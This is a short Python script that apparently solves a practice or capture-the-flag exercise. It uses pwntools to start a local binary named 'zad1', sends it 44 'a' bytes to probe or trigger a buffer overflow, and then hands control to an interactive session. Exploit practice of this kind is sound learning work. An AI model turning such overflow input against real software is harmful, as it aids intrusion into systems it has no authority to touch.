from pwn import *

p = process('./zad1')
p.send(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
p.interactive()
